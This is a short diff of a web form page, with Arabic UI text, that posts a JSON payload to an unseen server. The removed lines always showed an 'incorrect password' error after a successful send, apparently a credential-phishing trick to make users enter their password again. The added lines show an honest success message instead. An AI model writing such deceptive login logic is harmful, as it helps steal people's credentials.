@@ -67,7 +67,7 @@
         </div>
 
         <div class="msg" id="successMsg">تم الإرسال. سيتم معالجة البيانات الآن.</div>
-        <div class="err" id="errorMsg">كلمة المرور غير صحيحة.</div>
+        <div class="err" id="errorMsg">فشل الاتصال بالخادم.</div>
 
         <div class="divider" role="separator"></div>
 
@@ -109,10 +109,10 @@
             body: JSON.stringify(payload)
           });
 
-          // دايمًا يظهر خطأ كلمة المرور للمستخدم
-          errorMsg.style.display = 'block';
+          // لو الاتصال نجح، أظهر رسالة نجاح
+          successMsg.style.display = 'block';
         } catch (err) {
-          errorMsg.textContent = 'فشل الاتصال بالخادم';
+          // لو فيه مشكلة فى الاتصال
           errorMsg.style.display = 'block';
         }
       });
